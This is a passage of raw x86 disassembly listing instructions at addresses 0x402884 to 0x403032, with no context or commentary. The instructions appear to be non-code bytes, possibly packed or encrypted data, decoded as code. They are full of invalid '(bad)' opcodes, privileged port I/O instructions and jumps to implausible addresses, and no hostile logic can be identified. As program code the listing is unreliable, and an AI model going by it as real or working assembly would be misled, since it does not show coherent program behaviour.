  402884:	or     eax,DWORD PTR [eax+0x4b9b473]
  40288a:	mov    DWORD PTR [ebx+eax*8],esi
  40288d:	add    al,cl
  40288f:	int3   
  402890:	mov    cl,0xb9
  402892:	popf   
  402893:	jmp    0x402825
  402895:	das    
  402896:	fmul   DWORD PTR es:[ecx]
  402899:	stc    
  40289a:	stc    
  40289b:	inc    ecx
  40289c:	bound  esi,QWORD PTR [edi+0x1b]
  40289f:	add    bl,BYTE PTR [ebx]
  4028a1:	imul   ebx,ebp,0xffffffe5
  4028a4:	jmp    0x4028d3
  4028a6:	fcom   DWORD PTR [ebx]
  4028a8:	test   BYTE PTR [ecx+0x6],bh
  4028ab:	pop    ecx
  4028ac:	xchg   esi,eax
  4028ad:	imul   edx,DWORD PTR [ecx],0xffffffc2
  4028b0:	inc    edx
  4028b1:	cmp    al,0xb3
  4028b3:	cld    
  4028b4:	inc    edx
  4028b5:	mov    dl,0x8c
  4028b7:	icebp  
  4028b8:	jl     0x402908
  4028ba:	shr    esp,0x32
  4028bd:	dec    ecx
  4028be:	or     eax,0x2c71c7db
  4028c3:	push   edi
  4028c4:	fld    TBYTE PTR [ecx]
  4028c6:	(bad)  
  4028c8:	add    dh,BYTE PTR [ecx-0x6798f95a]
  4028ce:	or     DWORD PTR [ebx],esp
  4028d0:	pop    eax
  4028d1:	pop    eax
  4028d2:	jmp    0x402919
  4028d4:	mov    esp,DWORD PTR [esi]
  4028d6:	shl    BYTE PTR ds:0x988807d4,0xa1
  4028dd:	stos   DWORD PTR es:[edi],eax
  4028de:	fldenv [edi]
  4028e0:	mov    esi,0x13b0a41d
  4028e5:	ins    DWORD PTR es:[edi],dx
  4028e6:	lods   eax,DWORD PTR ds:[esi]
  4028e7:	jns    0x402945
  4028e9:	jecxz  0x4028db
  4028eb:	xchg   edi,eax
  4028ec:	cmp    eax,0xc6b61359
  4028f1:	push   edi
  4028f2:	mov    BYTE PTR [edi+0x6c],ah
  4028f5:	jae    0x402942
  4028f7:	ret    0xc436
  4028fa:	adc    dh,BYTE PTR [ebp+0x56]
  4028fd:	push   ebp
  4028fe:	mov    ch,0x89
  402900:	push   0x82ed6ee5
  402905:	push   0x98bb6b9c
  40290a:	sub    si,bx
  40290d:	dec    eax
  40290e:	enter  0x48c2,0x3d
  402912:	arpl   WORD PTR [ecx-0x5cc3dd],ax
  402918:	imul   esp,DWORD PTR [si-0x4a],0x76
  40291d:	xor    al,0xe1
  40291f:	sbb    BYTE PTR [ebp+0x65],dh
  402922:	jns    0x40290f
  402924:	jle    0x402915
  402926:	xchg   edx,eax
  402927:	jmp    0x4028b2
  402929:	repnz fwait
  40292b:	icebp  
  40292c:	sub    BYTE PTR [ebx-0x7c],cl
  40292f:	or     ecx,DWORD PTR [edx]
  402931:	mov    dl,0xed
  402933:	jmp    0x2800fd04
  402938:	inc    ebx
  402939:	xor    eax,0xd0b031a4
  40293e:	add    dl,bh
  402940:	rcl    BYTE PTR [eax-0x7e],0xdf
  402944:	stos   DWORD PTR es:[edi],eax
  402945:	mov    bh,0x46
  402947:	xchg   ebx,eax
  402948:	xor    al,0xd3
  40294a:	lock xchg edx,eax
  40294c:	add    bh,0x9a
  40294f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402950:	sbb    DWORD PTR [ebx-0x70],0xffffff9f
  402954:	jo     0x402947
  402956:	cwde   
  402957:	xor    DWORD PTR [edx+0x45],ebp
  40295a:	adc    al,0x32
  40295c:	sbb    esp,DWORD PTR ds:0x92426a07
  402962:	iret   
  402963:	mov    dh,0xe1
  402965:	ror    ebx,cl
  402967:	dec    ebx
  402968:	sbb    esi,DWORD PTR [edx+0x581fbe63]
  40296e:	mov    ch,0xe
  402971:	mov    al,ds:0xd2790364
  402976:	push   0x13
  402978:	mov    eax,ds:0x38ce15a1
  40297d:	mov    ch,0xc5
  40297f:	and    eax,0x534e0ba2
  402984:	pop    ebx
  402985:	pop    edi
  402986:	bnd jl 0x40290c
  402989:	into   
  40298a:	sbb    eax,ecx
  40298c:	hlt    
  40298d:	fnstsw WORD PTR [edi-0x51]
  402990:	inc    edx
  402991:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402992:	jbe    0x4029e6
  402994:	jl     0x4029d9
  402996:	ins    DWORD PTR es:[edi],dx
  402997:	pop    eax
  402998:	push   es
  402999:	mov    edi,0x317477b7
  40299e:	outs   dx,BYTE PTR ds:[esi]
  40299f:	cmp    esi,esi
  4029a1:	outs   dx,DWORD PTR ds:[esi]
  4029a2:	repz in eax,dx
  4029a4:	fld    TBYTE PTR [edx-0x35eb6b46]
  4029aa:	dec    ebx
  4029ab:	push   0x3a6dc082
  4029b0:	(bad)  
  4029b1:	(bad)  
  4029b3:	call   0x7d50979a
  4029b8:	out    dx,eax
  4029b9:	jecxz  0x402a2c
  4029bb:	push   ds
  4029bc:	icebp  
  4029bd:	lds    esi,FWORD PTR [ebp+0x8536b1]
  4029c3:	push   cs
  4029c4:	xchg   esi,eax
  4029c5:	sbb    cl,BYTE PTR [esi-0x66679116]
  4029cb:	fisttp WORD PTR [edx+eax*4-0x21]
  4029d0:	mov    ecx,0x21cd0d9f
  4029d5:	aam    0xd3
  4029d7:	mov    bl,BYTE PTR [ebp-0x2a29b89a]
  4029dd:	dec    edi
  4029de:	cwde   
  4029df:	pop    ss
  4029e0:	add    edi,DWORD PTR [esp+eiz*2-0x38]
  4029e4:	test   eax,0x45227cee
  4029e9:	and    eax,0xed057806
  4029ee:	(bad)  
  4029ef:	jecxz  0x402a36
  4029f1:	imul   ebp,DWORD PTR [edx-0x43],0x57
  4029f5:	sub    eax,0x11b965fb
  4029fa:	mov    edx,0x5883aa2
  4029ff:	mov    eax,ds:0xc42f328c
  402a04:	inc    edx
  402a05:	fisubr DWORD PTR [ebx-0x15]
  402a08:	inc    ebp
  402a09:	mov    bl,0x10
  402a0b:	fsubr  DWORD PTR [edi-0x36]
  402a0e:	pusha  
  402a0f:	mov    esi,0xb0d3c068
  402a14:	popf   
  402a15:	bsr    ecx,DWORD PTR [ecx]
  402a18:	mov    cl,0xa1
  402a1a:	repz sub DWORD PTR [eax-0x196483fc],esi
  402a21:	data16 idiv BYTE PTR [edi+esi*1-0x11]
  402a26:	daa    
  402a27:	retf   0xabf2
  402a2a:	xchg   esi,eax
  402a2b:	rcl    DWORD PTR [edx+0x58],0x7c
  402a2f:	in     al,0x1
  402a31:	(bad)  
  402a33:	int    0x6d
  402a35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a36:	jns    0x4029c4
  402a38:	test   DWORD PTR [ebp-0x1a3a4616],edx
  402a3e:	enter  0x8492,0xb3
  402a42:	push   ebx
  402a43:	mov    bl,ch
  402a45:	rol    DWORD PTR [eax-0x521ab783],1
  402a4b:	adc    al,0xf6
  402a4d:	std    
  402a4e:	push   ax
  402a50:	(bad)  
  402a51:	mov    ebp,0xe737d92b
  402a56:	xchg   ecx,eax
  402a57:	pop    ebx
  402a58:	mov    edx,0xb14b7b8b
  402a5d:	pop    edx
  402a5e:	sahf   
  402a5f:	call   0xf65e088d
  402a64:	sti    
  402a65:	or     bh,BYTE PTR ds:0x7e851725
  402a6b:	call   0x2cf76414
  402a70:	mov    BYTE PTR [eax+0x7e],ah
  402a73:	adc    ah,dh
  402a75:	mov    WORD PTR [edi],ds
  402a77:	int3   
  402a78:	push   eax
  402a79:	fcmovu st,st(2)
  402a7b:	mov    al,0x6e
  402a7d:	cwde   
  402a7e:	and    al,0xe5
  402a80:	jb     0x402a82
  402a82:	in     eax,0xf7
  402a84:	jmp    0x402b04
  402a86:	(bad)  
  402a87:	push   cs
  402a88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a89:	sub    BYTE PTR [ebp-0x4c740d67],dl
  402a8f:	inc    ebp
  402a90:	scas   al,BYTE PTR es:[edi]
  402a91:	sar    BYTE PTR ds:0x998ab613,1
  402a97:	fwait
  402a98:	mov    edi,DWORD PTR [ecx-0x36754d40]
  402a9e:	mov    BYTE PTR [eax+0x5698a00e],al
  402aa4:	ror    BYTE PTR [ecx+0x34],1
  402aa7:	ss es rcl ah,cl
  402aab:	xchg   DWORD PTR [ebp+0x4fbcbf7a],ebx
  402ab1:	(bad)  
  402ab2:	jns    0x402b0b
  402ab4:	jno    0x402a9d
  402ab6:	dec    esi
  402ab7:	mov    ds:0x533540ca,al
  402abc:	out    0x8a,eax
  402abe:	pop    edi
  402abf:	popa   
  402ac0:	cmp    ebx,ebp
  402ac2:	outs   dx,DWORD PTR ds:[esi]
  402ac3:	rol    DWORD PTR [eax+0x771d1f78],cl
  402ac9:	adc    esi,DWORD PTR [eax+0x21ff76d5]
  402acf:	fdiv   DWORD PTR [ebx-0x1e]
  402ad2:	(bad)  
  402ad3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ad4:	imul   esp,DWORD PTR [esi],0xf83a35e2
  402ada:	aam    0x5e
  402adc:	mov    edx,0xc55bcd72
  402ae1:	pop    ds
  402ae2:	mov    ch,0xb8
  402ae4:	cld    
  402ae5:	cwde   
  402ae6:	mov    eax,ds:0x28a1fa7e
  402aeb:	xor    dh,BYTE PTR [esi+0x4d]
  402aee:	cmc    
  402aef:	push   0x21f98dea
  402af4:	adc    eax,0xe690277
  402af9:	jo     0x402b73
  402afb:	leave  
  402afc:	push   cs
  402afd:	aaa    
  402afe:	xor    edi,ebp
  402b00:	retf   
  402b01:	dec    esp
  402b02:	mov    ch,0xb0
  402b04:	cdq    
  402b05:	or     edi,DWORD PTR [edi]
  402b07:	dec    edi
  402b08:	or     BYTE PTR [ecx+0x5c],ch
  402b0b:	(bad)  
  402b0d:	ror    BYTE PTR [esi+0x34],0xc5
  402b11:	sub    al,0x7a
  402b13:	sub    DWORD PTR [edx],esp
  402b15:	cmp    BYTE PTR [ecx],ah
  402b17:	cdq    
  402b18:	cdq    
  402b19:	jb     0x402b93
  402b1b:	adc    ebx,edx
  402b1d:	dec    edi
  402b1e:	dec    edx
  402b1f:	xchg   esp,eax
  402b20:	mov    ebp,0x48126b5c
  402b25:	xchg   ebp,eax
  402b26:	test   ebp,esi
  402b28:	jnp    0x402b15
  402b2a:	popa   
  402b2b:	mov    esp,DWORD PTR [ebx+0x3e]
  402b2e:	and    eax,0x3cb4f72c
  402b33:	call   0xfb5986e2
  402b38:	cs jbe 0x402bad
  402b3b:	frstor [eax]
  402b3d:	repz inc edx
  402b3f:	fldl2t 
  402b41:	xchg   esp,eax
  402b42:	in     al,dx
  402b43:	mov    esp,0x54ce0003
  402b48:	jecxz  0x402aed
  402b4a:	rcr    DWORD PTR [edx-0x37],1
  402b4d:	sbb    BYTE PTR [ebx],al
  402b4f:	push   edi
  402b50:	out    0x2f,eax
  402b52:	dec    ebx
  402b53:	and    cl,BYTE PTR ds:0x8908bc58
  402b59:	dec    eax
  402b5a:	ret    
  402b5b:	xchg   DWORD PTR [ecx+0x4f],edi
  402b5e:	int    0x29
  402b60:	cdq    
  402b61:	add    BYTE PTR [edx+eax*2-0x78b20353],bh
  402b68:	dec    esp
  402b69:	push   dx
  402b6b:	mov    edi,0xf4ef3e90
  402b70:	jno    0x402b42
  402b72:	mov    ds:0x36a4dd38,eax
  402b77:	mov    edi,0xdba89068
  402b7c:	pop    ecx
  402b7d:	icebp  
  402b7e:	gs js  0x402b0f
  402b81:	or     DWORD PTR [edi+0x386035fb],esi
  402b87:	pop    ebp
  402b88:	push   0x3121d731
  402b8d:	loop   0x402b68
  402b8f:	clc    
  402b90:	jns    0x402b17
  402b92:	jo     0x402bd8
  402b94:	jle    0x402b1c
  402b96:	sahf   
  402b97:	popf   
  402b98:	(bad)  
  402b9b:	mov    ebp,DWORD PTR [edi+0x67]
  402b9e:	cdq    
  402b9f:	jbe    0x402ba1
  402ba1:	sbb    eax,0x646b8243
  402ba6:	loopne 0x402bf9
  402ba8:	add    edx,DWORD PTR [eax]
  402baa:	(bad)  
  402bab:	mov    edi,0x91af8a40
  402bb0:	iret   
  402bb1:	adc    eax,0xcd7276b5
  402bb6:	jne    0x402c2a
  402bb8:	int3   
  402bb9:	lods   al,BYTE PTR ds:[esi]
  402bba:	inc    esi
  402bbb:	lods   eax,DWORD PTR ds:[esi]
  402bbc:	ins    BYTE PTR es:[edi],dx
  402bbd:	inc    esp
  402bbe:	inc    edi
  402bbf:	add    al,0xc4
  402bc1:	cs xor al,0x78
  402bc4:	pop    es
  402bc5:	repnz sub eax,0x49b2d439
  402bcb:	dec    ecx
  402bcc:	pusha  
  402bcd:	mov    edi,0x9c6335d0
  402bd2:	je     0x402bf7
  402bd4:	jbe    0x402c2f
  402bd6:	cwde   
  402bd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bd8:	adc    ecx,DWORD PTR [edi]
  402bda:	fisub  WORD PTR [edx+0x2968dda9]
  402be0:	push   ebp
  402be1:	out    dx,al
  402be2:	xchg   edx,eax
  402be3:	sti    
  402be4:	and    al,BYTE PTR [esi-0x71]
  402be7:	pop    esp
  402be8:	test   eax,0xf08f19a6
  402bed:	mov    BYTE PTR [ecx],cl
  402bef:	adc    DWORD PTR [ebp-0x7dccf94b],ecx
  402bf5:	jmp    0x402be8
  402bf7:	stos   BYTE PTR es:[edi],al
  402bf8:	push   ss
  402bf9:	xchg   DWORD PTR [ebp-0x44a4625],ecx
  402bff:	dec    ecx
  402c00:	popa   
  402c01:	jmp    0x387e:0xa5d522ab
  402c08:	outs   dx,DWORD PTR ds:[si]
  402c0a:	push   ds
  402c0b:	adc    bl,BYTE PTR [edx+edi*2]
  402c0e:	retf   0xe93b
  402c11:	outs   dx,DWORD PTR ds:[esi]
  402c12:	aaa    
  402c13:	test   DWORD PTR [ebx-0xe],ebx
  402c16:	int3   
  402c17:	cmp    BYTE PTR [eax-0x39ac126c],dl
  402c1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c1e:	shl    BYTE PTR [ecx-0x35d8a7f5],1
  402c24:	ffreep st(0)
  402c26:	test   al,0x5e
  402c28:	xchg   esp,eax
  402c29:	sub    BYTE PTR [edi],ah
  402c2b:	dec    edi
  402c2c:	and    al,0xa
  402c2e:	(bad)  
  402c2f:	aam    0xf3
  402c31:	(bad)  
  402c32:	push   ebx
  402c33:	or     esp,DWORD PTR [ebx+0x71]
  402c36:	(bad)  
  402c37:	or     al,0xf3
  402c39:	cmp    DWORD PTR [ebx],0xdd23854d
  402c3f:	dec    edx
  402c41:	jnp    0x402be9
  402c43:	xchg   esi,eax
  402c44:	es ds and eax,0xd59e95a3
  402c4b:	mov    esi,0xea27d5d9
  402c50:	stc    
  402c51:	jecxz  0x402bd6
  402c53:	jns    0x402be3
  402c55:	xchg   ebx,eax
  402c56:	pop    esp
  402c57:	mov    cl,bl
  402c59:	mov    edi,0xc1e12a5c
  402c5e:	inc    edi
  402c5f:	add    eax,0xd478b12a
  402c64:	lods   al,BYTE PTR ds:[esi]
  402c65:	add    edi,DWORD PTR [edx+0x7eeccaba]
  402c6b:	in     eax,0x4e
  402c6d:	sub    al,0x2a
  402c6f:	xchg   ecx,eax
  402c70:	mov    al,ds:0xb6a3d205
  402c75:	popa   
  402c76:	shl    BYTE PTR [eax-0x5],cl
  402c79:	jle    0x402c2e
  402c7b:	cmp    al,0xf3
  402c7d:	inc    edx
  402c7e:	xchg   edx,eax
  402c7f:	test   BYTE PTR [edx+0x16],ah
  402c82:	xchg   DWORD PTR [edx+0x3f41f0de],edi
  402c88:	mov    ecx,0x97a7b1d4
  402c8d:	jno    0x499f4a15
  402c93:	push   ds
  402c94:	cmp    al,0x55
  402c96:	inc    edi
  402c97:	jecxz  0x402c8f
  402c99:	out    0xcd,eax
  402c9b:	xor    ch,BYTE PTR [esi-0x79bfa54]
  402ca1:	loop   0x402c82
  402ca3:	imul   bh
  402ca5:	xchg   DWORD PTR [eax+ebp*8-0x2d],edi
  402ca9:	fs fs sub eax,0xb35f68e5
  402cb0:	cmp    BYTE PTR [ebp-0x6e],cl
  402cb3:	sub    bl,0x81
  402cb6:	push   ss
  402cb7:	fisub  WORD PTR [ebx-0x29]
  402cba:	leave  
  402cbb:	cmp    dh,BYTE PTR [ebx-0x29]
  402cbe:	data16 in al,dx
  402cc0:	daa    
  402cc1:	fwait
  402cc2:	out    0x6,eax
  402cc4:	dec    esi
  402cc5:	xchg   BYTE PTR [esi+0x1c633f],al
  402ccb:	nop
  402ccc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ccd:	sbb    edx,DWORD PTR [eax-0x76cea4dd]
  402cd3:	and    BYTE PTR [ebx],dh
  402cd5:	mov    al,0x9c
  402cd7:	cmp    edx,DWORD PTR [ebx-0x13aeb21b]
  402cdd:	mov    esi,DWORD PTR [edi]
  402cdf:	(bad)  
  402ce0:	fscale 
  402ce2:	dec    ebp
  402ce3:	lahf   
  402ce4:	lahf   
  402ce5:	push   ecx
  402ce6:	lock ficom DWORD PTR ds:0xacaf34f1
  402ced:	cmp    eax,0x9420fdd7
  402cf2:	out    0xed,al
  402cf4:	xchg   BYTE PTR [esi+0x7b],ch
  402cf7:	fdivr  QWORD PTR [ebp+0x18]
  402cfa:	cs mov db3,esi
  402cfe:	mov    ecx,0x81eaa585
  402d03:	inc    ebx
  402d04:	or     al,0xe6
  402d06:	jnp    0x402ccd
  402d08:	push   ds
  402d09:	mov    esi,DWORD PTR [ebp-0x6f6d854c]
  402d0f:	fwait
  402d10:	scas   eax,DWORD PTR es:[edi]
  402d11:	pop    ebp
  402d12:	sti    
  402d13:	mov    dl,0xc7
  402d15:	out    dx,al
  402d16:	mov    edi,DWORD PTR [edi+ebp*1-0x6385942e]
  402d1d:	out    0x6a,al
  402d1f:	arpl   WORD PTR [ebx-0x53],sp
  402d22:	das    
  402d23:	imul   ecx,DWORD PTR [edx],0x7ccdc21
  402d29:	jg     0x402d03
  402d2b:	fcom   QWORD PTR [edx+0x25]
  402d2e:	pop    esi
  402d2f:	xor    DWORD PTR [eax],esp
  402d31:	in     al,dx
  402d32:	out    0xb5,al
  402d34:	cmp    DWORD PTR [ebp-0x1a818fe4],ebp
  402d3a:	pop    edi
  402d3b:	dec    ecx
  402d3c:	ret    
  402d3d:	and    ecx,eax
  402d3f:	aas    
  402d40:	(bad)  
  402d41:	test   al,0x84
  402d43:	push   ebx
  402d44:	adc    BYTE PTR [edx-0x67ace14b],cl
  402d4a:	push   ebx
  402d4b:	jnp    0x402dc1
  402d4d:	mov    cl,0x25
  402d4f:	out    0x24,al
  402d51:	retf   0x9011
  402d54:	test   DWORD PTR [ecx-0x3e],ecx
  402d57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d58:	add    BYTE PTR [ecx-0xc],ah
  402d5b:	mov    ds:0x4ea8e226,eax
  402d60:	fld    QWORD PTR [ebx+0x6d5a0bb3]
  402d66:	data16 or BYTE PTR [edx],dh
  402d69:	dec    eax
  402d6a:	mov    edx,0x75a9d2d4
  402d6f:	xchg   ecx,eax
  402d70:	fisub  DWORD PTR [edi*1-0x3ebdd089]
  402d77:	push   ss
  402d78:	and    bh,dl
  402d7a:	fst    DWORD PTR [ebp-0x2]
  402d7d:	hlt    
  402d7e:	repz inc ecx
  402d80:	inc    edx
  402d81:	inc    edi
  402d82:	cmc    
  402d83:	add    eax,0x3995c593
  402d88:	sbb    dl,BYTE PTR [ebx+edx*2+0x7d]
  402d8c:	lock ins BYTE PTR es:[edi],dx
  402d8e:	lods   eax,DWORD PTR ds:[esi]
  402d8f:	jmp    DWORD PTR [edi+0x37]
  402d92:	enter  0x3097,0x82
  402d96:	jns    0x402d1f
  402d98:	scas   al,BYTE PTR es:[edi]
  402d99:	popa   
  402d9a:	sub    al,0x65
  402d9c:	imul   edi,DWORD PTR [ebp+0x70],0x20e1191d
  402da3:	mov    ds:0x3f040187,eax
  402da8:	dec    eax
  402da9:	stc    
  402daa:	(bad)  [ebp+0x5c]
  402dad:	rcl    BYTE PTR [ecx],0x74
  402db0:	leave  
  402db1:	imul   esp,ebx,0xffffffdf
  402db4:	daa    
  402db5:	aaa    
  402db6:	jmp    0x402d85
  402db8:	cld    
  402db9:	jo     0x402dc8
  402dbb:	jbe    0x402e1f
  402dbd:	or     BYTE PTR [edi],0x5
  402dc0:	aam    0xc0
  402dc2:	mov    ds:0x57b9c39,al
  402dc7:	jo     0x402dd3
  402dc9:	pop    ecx
  402dca:	sbb    al,0xf8
  402dcc:	outs   dx,DWORD PTR ds:[esi]
  402dcd:	push   ebx
  402dce:	jle    0x402e11
  402dd0:	jne    0x402e22
  402dd2:	dec    esi
  402dd3:	dec    esp
  402dd4:	sub    BYTE PTR [ecx],0x32
  402dd7:	cmp    ecx,DWORD PTR [edx-0x4d]
  402dda:	scas   eax,DWORD PTR es:[edi]
  402ddb:	mov    eax,0xc68a867a
  402de0:	popf   
  402de1:	sti    
  402de2:	imul   BYTE PTR [edi-0x1]
  402de5:	aam    0xdb
  402de7:	fadd   st,st(3)
  402de9:	enterw 0x51f7,0x91
  402dee:	in     eax,dx
  402def:	push   eax
  402df0:	test   eax,0xf1f84ce1
  402df5:	push   eax
  402df6:	fiadd  DWORD PTR [ebp-0x77]
  402df9:	mov    cr4,edi
  402dfc:	ins    BYTE PTR es:[edi],dx
  402dfd:	rcl    DWORD PTR [ebp+0x7d3b5b2d],0xe9
  402e04:	inc    edx
  402e05:	push   0x79
  402e07:	aaa    
  402e08:	pop    ss
  402e09:	pop    ebp
  402e0a:	out    0x82,eax
  402e0c:	scas   al,BYTE PTR es:[edi]
  402e0d:	jns    0x402e06
  402e0f:	sub    eax,0xe831fbd7
  402e14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e15:	mov    bl,0x38
  402e17:	test   BYTE PTR [eax-0x1d],bh
  402e1a:	and    al,BYTE PTR [ecx+0x57fe3830]
  402e20:	ret    
  402e21:	sahf   
  402e22:	or     ecx,ebx
  402e24:	push   esi
  402e25:	lahf   
  402e26:	push   ss
  402e27:	sti    
  402e28:	mov    esp,ebp
  402e2a:	and    DWORD PTR [ebx],esi
  402e2c:	and    al,0xf0
  402e2e:	rcr    edi,cl
  402e30:	and    al,0xc0
  402e32:	enter  0x5419,0x65
  402e36:	enter  0x1384,0xe1
  402e3a:	xchg   ecx,eax
  402e3b:	sti    
  402e3c:	push   esp
  402e3d:	outs   dx,DWORD PTR ds:[esi]
  402e3e:	xor    ah,BYTE PTR [ebp+0xf8e3d9f]
  402e44:	call   0x137e5594
  402e49:	sbb    ebx,esp
  402e4b:	inc    ebp
  402e4c:	ret    0x25d9
  402e4f:	cmp    dh,ch
  402e51:	bound  edx,QWORD PTR [eax]
  402e53:	test   DWORD PTR [ebx-0x35fdddce],ebx
  402e59:	fdivr  QWORD PTR [ecx+0x69]
  402e5c:	out    dx,al
  402e5d:	aas    
  402e5e:	mov    ecx,0xfeae6dad
  402e63:	pop    ecx
  402e64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e65:	rol    BYTE PTR [esi-0x7610697e],1
  402e6b:	adc    BYTE PTR ds:0x626c1371,0xab
  402e72:	fimul  DWORD PTR [eax-0x22a46d69]
  402e78:	fucomi st,st(3)
  402e7a:	sbb    al,0x14
  402e7c:	inc    ecx
  402e7d:	dec    esi
  402e7e:	cwde   
  402e7f:	cmp    esp,ecx
  402e81:	push   ebx
  402e82:	mov    ecx,0x23429784
  402e87:	dec    esi
  402e88:	pushf  
  402e89:	mov    eax,0xc0fbda4d
  402e8e:	repz sbb bl,BYTE PTR [esi+0x3f96eae2]
  402e95:	inc    ebx
  402e96:	stos   BYTE PTR es:[edi],al
  402e97:	ds neg ebp
  402e9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e9b:	pop    ecx
  402e9c:	jnp    0x402f13
  402e9e:	das    
  402e9f:	mov    dh,cl
  402ea1:	mov    edi,eax
  402ea3:	mov    esp,0x649efb72
  402ea8:	inc    edx
  402ea9:	push   ecx
  402eaa:	bound  ecx,QWORD PTR [eax+edi*1+0x208e8837]
  402eb1:	sahf   
  402eb2:	sub    DWORD PTR [eax-0x79648a90],edx
  402eb8:	outs   dx,DWORD PTR ds:[esi]
  402eb9:	mov    ch,BYTE PTR [edi+edx*2+0x7b]
  402ebd:	cmp    eax,0x22861571
  402ec2:	test   eax,0xbbd694b4
  402ec7:	adc    DWORD PTR [edi-0x2b228233],eax
  402ecd:	lds    edi,FWORD PTR [esi]
  402ecf:	push   esi
  402ed0:	inc    edx
  402ed1:	sbb    dh,dl
  402ed3:	xlat   BYTE PTR ds:[ebx]
  402ed4:	aad    0x6c
  402ed6:	inc    esp
  402ed7:	cmp    DWORD PTR [edx+0x1eaca5f3],esp
  402edd:	push   ecx
  402ede:	shl    cl,1
  402ee0:	rol    BYTE PTR [ebx],cl
  402ee2:	fcom   QWORD PTR [ecx+ecx*8-0x696577a4]
  402ee9:	xor    al,0xce
  402eeb:	xchg   ebx,eax
  402eec:	or     ah,BYTE PTR [esi+0x30]
  402eef:	in     eax,0x78
  402ef1:	imul   esi,eax,0xbab2a334
  402ef7:	lds    esp,FWORD PTR [ecx]
  402ef9:	aad    0x18
  402efb:	xor    esp,edi
  402efd:	ret    0x4a5a
  402f00:	stos   DWORD PTR es:[edi],eax
  402f01:	pop    esp
  402f02:	jmp    0xa2782977
  402f07:	cmc    
  402f08:	call   0x4f02ca88
  402f0d:	icebp  
  402f0e:	cmc    
  402f0f:	fdivr  QWORD PTR [ecx]
  402f11:	add    al,0x30
  402f13:	(bad)  
  402f14:	jecxz  0x402f5c
  402f16:	inc    ebx
  402f17:	add    ebp,edi
  402f19:	push   es
  402f1a:	mov    al,0x60
  402f1c:	add    BYTE PTR ss:[esi],cl
  402f1f:	sbb    ebp,ebp
  402f21:	rol    BYTE PTR [esi+0x1927b923],0xb5
  402f28:	mov    edi,DWORD PTR [eax-0x3485dee7]
  402f2e:	inc    edx
  402f2f:	repz sahf 
  402f31:	cs cli 
  402f33:	sbb    eax,0x5a332408
  402f38:	(bad)
  402f3b:	mov    ecx,0x3e0df45c
  402f40:	pop    ecx
  402f41:	jno    0x402f8e
  402f43:	xchg   DWORD PTR [edx+0x3c52e568],ebx
  402f49:	(bad)  [eax-0x6ded0006]
  402f4f:	sahf   
  402f50:	test   eax,0x79db8567
  402f55:	lea    si,[bx+si-0x3b]
  402f5a:	mov    ds:0x49f8d2c3,eax
  402f5f:	ja     0x402f5d
  402f61:	inc    ecx
  402f62:	aam    0x45
  402f64:	or     eax,0xd66a5bbb
  402f69:	fisub  WORD PTR [eax]
  402f6b:	loopne 0x402fe1
  402f6d:	push   edx
  402f6e:	xchg   esi,eax
  402f6f:	pushf  
  402f70:	rol    BYTE PTR [esp+eiz*2-0x674a42e8],cl
  402f77:	std    
  402f78:	lods   al,BYTE PTR ds:[esi]
  402f79:	xor    BYTE PTR [ecx],al
  402f7b:	icebp  
  402f7c:	push   ebp
  402f7d:	mov    BYTE PTR [edi],al
  402f7f:	stos   BYTE PTR es:[edi],al
  402f80:	scas   eax,DWORD PTR es:[edi]
  402f81:	dec    ecx
  402f82:	or     eax,0x31de0d17
  402f87:	test   dh,dh
  402f89:	mov    edi,0x31d187ae
  402f8e:	call   0x9493cbd9
  402f93:	popa   
  402f94:	sub    bh,BYTE PTR [ebx+0x31]
  402f97:	or     BYTE PTR [esi-0x4461f91d],dh
  402f9d:	sbb    eax,0x95c0da3a
  402fa2:	std    
  402fa3:	sahf   
  402fa4:	pop    edi
  402fa5:	sbb    ebx,DWORD PTR [edi+0x42334a1a]
  402fab:	stos   DWORD PTR es:[edi],eax
  402fac:	adc    eax,0x9a1b4d38
  402fb1:	mov    dh,0x7b
  402fb3:	into   
  402fb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fb5:	adc    al,0xea
  402fb7:	pop    es
  402fb8:	in     al,0x7e
  402fba:	stos   DWORD PTR es:[edi],eax
  402fbb:	jbe    0x402f4b
  402fbd:	bound  ebx,QWORD PTR ds:[esi]
  402fc0:	mov    ch,BYTE PTR [esi]
  402fc2:	mov    DWORD PTR [eax-0x10],ecx
  402fc5:	xor    edi,DWORD PTR [esi]
  402fc7:	adc    al,0x43
  402fc9:	xor    ecx,DWORD PTR [ebx-0x43]
  402fcc:	loop   0x403048
  402fce:	push   eax
  402fcf:	add    eax,0xfe1bbff1
  402fd4:	nop
  402fd5:	sbb    edx,edx
  402fd7:	inc    esi
  402fd8:	les    ebp,FWORD PTR [edx-0x49e688e4]
  402fde:	aas    
  402fdf:	and    ebx,ebx
  402fe1:	pop    ds
  402fe2:	mov    ah,0x58
  402fe4:	ins    BYTE PTR es:[edi],dx
  402fe5:	ror    DWORD PTR [edx+ebp*1],cl
  402fe8:	(bad)  
  402fea:	xor    ch,0x56
  402fed:	mov    ebx,edx
  402fef:	dec    ebp
  402ff0:	sbb    eax,0x1e486d71
  402ff5:	dec    esp
  402ff6:	cwde   
  402ff7:	int    0x3
  402ff9:	pop    edx
  402ffa:	call   0x96d9:0x79fd2e3b
  403001:	xchg   edi,ecx
  403003:	dec    esp
  403004:	(bad)  
  403005:	std    
  403006:	jae    0x403046
  403008:	out    dx,al
  403009:	cmp    ah,BYTE PTR [ebp+0x22]
  40300c:	inc    esi
  40300d:	(bad)  
  40300e:	sbb    dl,BYTE PTR [edi-0x18]
  403011:	pop    edi
  403012:	jmp    0xcd1b1f05
  403017:	sbb    eax,0x5720f333
  40301c:	sbb    cl,BYTE PTR [edx+ebp*2-0x70e5badc]
  403023:	xor    BYTE PTR [edx],ah
  403025:	in     al,dx
  403026:	push   DWORD PTR [ebp+0x18175d21]
  40302c:	add    eax,0xc2c82b43
  403031:	inc    ebx
  403032:	jae    0x402fcf
